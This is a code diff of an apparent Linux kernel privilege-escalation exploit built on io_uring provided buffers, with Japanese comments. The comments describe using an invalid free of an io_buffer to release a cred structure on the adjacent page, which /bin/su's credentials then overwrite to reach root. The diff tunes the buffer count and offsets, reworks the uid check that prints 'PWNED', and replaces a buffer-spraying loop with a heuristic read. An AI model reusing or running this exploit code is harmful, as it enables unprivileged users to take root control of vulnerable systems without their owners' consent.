@@ -31,7 +31,7 @@
 #define PAGE 0x1000UL
 
 #define NUM_IOBUF \
-  0x138  // UNIMPLEMENTED:
+  0x23D  // UNIMPLEMENTED:
          // 微調整して最後のio_bufferがページの最後の方に来るように
 char iobufs[PAGE][NUM_IOBUF] = {0};
 
@@ -204,8 +204,8 @@ void *setcap_worker(void *arg) {
    * 自身のcredが/bin/suのcredによって上書きされるとEUIDが0になる。
    */
   while (state->pwned == 0) {
-    // if (getuid() == 0 || geteuid() == 0) {
-    if (geteuid() == 0) {
+    if (getuid() == 0 || geteuid() == 0) {
+      // if (geteuid() == 0) {
       puts("\n[!] PWNED!!!!!!!!!!!!!!!!!\n");
       state->pwned = 1;
       printf("[!] WHOAMI: uid=%d euid=%d\n", getuid(), geteuid());
@@ -360,40 +360,10 @@ int main(void) {
   /**
    * io_bufferのinvalid freeを使って次のページにあるcredをfreeする。
    */
-  for (int ix = 0; ix != PAGE / 0x20; ++ix) {
-    pinning_thread(0);
-
-    // feed
-    struct io_uring_sqe *sqe = NULL;
-    struct io_uring_cqe *cqe = NULL;
-
-    sqe = io_uring_get_sqe(&ring);
-    io_uring_prep_provide_buffers(sqe, iobufs, PAGE, 1, 0, ix);
-    io_uring_submit(&ring);
-    io_uring_wait_cqe(&ring, &cqe);
-    if (cqe->res < 0) errExit("io_uring_prep_provide_buffers");
-    io_uring_cqe_seen(&ring, cqe);
-
-    int seq_fd = open("/proc/self/stat", O_RDONLY);
-
-    // consume
-    sqe = io_uring_get_sqe(&ring);
-    io_uring_prep_read(sqe, seq_fd, NULL, 0x20, 0);
-    io_uring_sqe_set_flags(sqe, IOSQE_BUFFER_SELECT);
-    sqe->buf_group = 0;
-    io_uring_submit(&ring);
-    io_uring_wait_cqe(&ring, &cqe);
-    if (cqe->res != 0x20) errExit("io_uring_prep_read");
-    io_uring_cqe_seen(&ring, cqe);
-
-    // ring_submit_buffer(&ring, (char *)iobufs, PAGE, 1, 0, NUM_IOBUF + ix);
-    // ring_wait_cqe(&ring);
-
-    // int seq_fd = open("/proc/self/stat", O_RDONLY);
-
-    // ring_submit_read(&ring, seq_fd, 0x20, 0, 0);
-    // ring_wait_cqe(&ring);
-  }
+  const ulong cred_offset =
+      0x140;  // HEURISTIC: 最後のio_bufferと次のページまでのオフセット
+  ring_submit_read(&ring, fd, cred_offset, 0, 0);
+  assert(ring_wait_cqe(&ring) == cred_offset);
 
   /**
    * `/bin/su`を実行するように合図する
